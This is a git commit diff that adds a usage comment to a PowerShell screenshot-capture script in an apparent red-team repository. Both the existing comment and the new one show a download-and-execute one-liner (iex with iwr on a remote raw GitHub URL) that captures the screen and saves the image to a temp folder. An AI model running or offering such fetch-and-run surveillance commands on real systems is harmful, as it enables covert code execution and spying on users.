b1e327185e0181d48eed913ca86961f27d876045
Bank_Security <m.molte@hotmail.it>
2019-10-12 13:29:02 +0200

    Update Take_ScreenShot_Path_Selection.ps1

--- Discovery/Take_ScreenShot_Path_Selection.ps1
+++ Discovery/Take_ScreenShot_Path_Selection.ps1
@@ -2,6 +2,8 @@ Function New-ScreenShot {
 #USAGE:
 # iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Path_Selection.ps1);New-ScreenShot -Full 
 # --> Specify path manually 
+# OR
+# powershell.exe "iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Path_Selection.ps1);New-ScreenShot -Full -Path C:\Windows\Temp\ScreenShot.jpg"
 
 [cmdletbinding(SupportsShouldProcess=$True)]
 
